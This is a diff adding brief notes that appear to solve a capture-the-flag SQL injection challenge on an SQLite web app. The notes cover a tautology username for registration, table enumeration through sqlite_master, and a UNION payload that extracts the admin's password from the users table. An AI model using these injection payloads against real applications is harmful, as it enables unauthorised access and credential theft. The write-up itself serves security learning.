@@ -1,0 +1,39 @@
+hint: sqlite
+
+what's injectable? tried to bypass form login, but that operation does
+not require union, so not the right approach.
+
+tried registering with `admin' or ''='` and logged in as that user,
+noticed that the displayed posts were funky, so tried to attack the
+registration form for user
+
+error message when bad query: 
+
+select id, user, post from posts where user = '
+	test' union select user,password,3 from posts where user='admin
+';
+
+because sqlite, we know there is a table called sqlite_master, so we
+can get the tables by the following:
+
+	select name from sqlite_master where type='table';
+
+we need to stick this in with the previous query, so we need to use
+the union keyword, making sure we have the same number of columns
+
+	select 1,2,name from ... etc.
+
+this gives us the tables `users` and `posts`.
+
+We can continue to guess the column names (user, pass), trying to get
+the admin's password.
+
+payload:
+
+	x' union select 1, user, pass from users where user='admin
+
+generates:
+
+select id, user, post from posts where user='
+	x' union select 1, user, pass from users where user='admin
+';	
